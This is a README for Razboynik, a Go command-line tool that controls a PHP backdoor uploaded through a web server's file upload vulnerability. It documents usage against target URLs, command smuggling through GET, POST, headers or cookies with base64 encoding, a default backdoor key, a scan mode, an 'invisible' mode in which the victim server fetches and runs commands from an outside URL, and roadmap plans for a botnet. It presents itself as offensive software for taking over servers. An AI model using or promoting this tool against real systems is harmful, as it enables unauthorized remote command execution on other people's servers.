#Razboynik - разбойник
Razboynik is the FurezLegacy project on Go

##Main Goal ?
Razboynik wants to be the best reverse shell based on PHP backdoor

##FurezLegacy ?
FurezApi Framework was a little PHP website that exploit PHP backdoor.
It allow you to exploit file upload vulnerability on web server.
The main goal was pretty simple : Test every possibilities of infected files to upload, and then, if the upload is successful:

- giving you a user interface to manage datas
- allowing you to do what you want on server

Show the folder structure of the website ? Show a specific file ? Zip content ? Download content ? Upload or even delete ? If the API succeed to be upload on the server. You're the new king of this one!

##Why Razboynik ?
Where FurezApi Framework and later FurezExploit (C++ brother) were boring and long to setup and install, Razboynik learnt about those mistakes and fix it. 
Razboynik is giving you a better interface to handle the server (nothing better than shell). Easier to install, faster to use, better to customize and hot new functionnalities:
- Encoding all the request (Crypto on the way)
- Infected requests by GET, POST, Headers or Cookies
- Logs every result in file
- Better interface
- Easy to plug bundle and plugin thanks to modules
- Proxied tunnel (on the way)

##Binary
(Not available yet)

Binaries for differents platforms (Linux, Windows and soon or later Mac) will be available in the `./bin` directory. So if you don't want to build the application by yourself you can use it.

On Windows launch: `./bin/razboynik.exe`
On linux (in your terminal): (root directory) `./bin/razboynik`

##Build locally
###Requirements
These requirements are necessary only if you want to build the app:
- `Golang`

###Dependencies
These dependencies will be install:
- `eatbytes/razboy` (Business logic and core of razboynik)
- `urfave/cli` (Usefull utility to handle flag and parse command)
- `chzyer/readline` (Implementation of readline to loop on command)
- `fatih/color` (Great colors to push on terminal)
- `golang library` (fmt, strings, buffer, etc...)

###Installation
Instructions to build the app:
- `git clone https://github.com/EatBytes/razboynik.git` (or SSH if you want)
- `cd razboynik`
- `go get`
- `go build`

(Makefile on the way)

##Demo
[![asciicast](https://asciinema.org/a/92281.png)](https://asciinema.org/a/92281)

Let's suppose you find a file upload vulnerability in a website and you upload the script available in `res/backdoor` folder.
Now the url of your script could be (as example) : http://{website}/uploads/script.php

With this statement we can use razboynik as it follow :
- `./razboynik run -u http://{website}/uploads/script.php`
or (shortcut)
- `./razboynik r -u http://{website}/uploads/script.php`

If you want to change the parameter sent, add -p flag and precise it. Like : `./razboynik r -u ... -p myParameter`.
By default the parameter is "razboynik". Parameter is the name of the field or header or cookie (depends on method) sent to server. If the method is GET, razboynik will simply add at the end of the url = ?razboynik={request}.

If you want to change the method, add -m flag as : `./razboynik r -u ... -m POST`.
By default, method is set to GET. You have the choice between : GET, POST, HEADER (evil request will be set in headers), COOKIE.

For more option you can add -h flag. Or type `./razboynik help`.

##API
You will find the API of all the business logic in the appropriate repository `razboy`

###run
Run a reverse shell with specified configuration

OPTIONS: 
    - `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
    - `-m, --method`: (string) Method to use. Ex: `-m POST` (default: "GET")
    - `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
    - `-s, --shellmethod`: (int) Shellmethod to use. Ex: `-s 0` (default: 0) [0 => system(), 1 => shell_exec()]
    - `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: "FromRussiaWithLove<3")
    - `-r, --raw`: (bool) If set, send the request without base64 encoding
    - `-c, --crypt`: (Not available)

###generate
(Not available yet)

###scan
Scan a website to identify what shell method and method works on it.

OPTIONS:
    - `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
    - `-p, --parameter`: (string) Parameter to use. Ex: `-p test` (default: "razboynik")
    - `-k, --key`: (string) Key to unlock optional small protecion. Ex: `-k keytounlock` (default: "FromRussiaWithLove<3")

###invisible
Execute a raw command available at an url (referer). Ex: http://website/cmd.txt point to `'echo 1;'` in body, then I can do : 
    - `-u ... -r http://website/cmd.txt`

OPTIONS:
    - `-u, --url`: (string) Url of the target. Ex: `-u http://localhost/script.php`
    - `-r, --referer`: (string) Url that the server will call to get the cmd to execute. Ex: `-r http://website.com/cmd-i-want-to-execute.txt`

###encode / decode
Encode or decode string.

Ex: encode hello => aGVsbG8=
    decode aGVsbG8= => hello

##Roadmap
###1.5.0
- Raw request
- Better error in razboy (core)
- Add more information when run fail
- Add cookie method
- Implement optional key protection
- Add base64 encoding and decoding to root
- Add invisible method

###1.6.0
- Add web server (FurezApi legacy)
- Add `./bin` folder with binaries
- More documentation
- Add asciinema video (in progress)
- Create a botnet ? Handle multiple server at the same time
- Config file
- Proxied tunnel
- Crypto
